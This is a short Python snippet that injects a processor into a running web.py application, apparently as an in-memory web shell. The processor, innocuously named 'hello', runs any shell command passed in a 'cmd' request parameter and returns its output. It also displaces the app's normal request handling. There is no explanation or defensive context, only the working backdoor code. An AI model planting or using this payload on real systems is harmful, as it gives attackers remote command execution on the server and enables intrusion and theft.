import sys
def hello(handler): 
        import subprocess
        params = web.input()
        cmd = params.cmd
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        return output
app = sys.modules['__main__'].__dict__['app']
app.add_processor(hello)



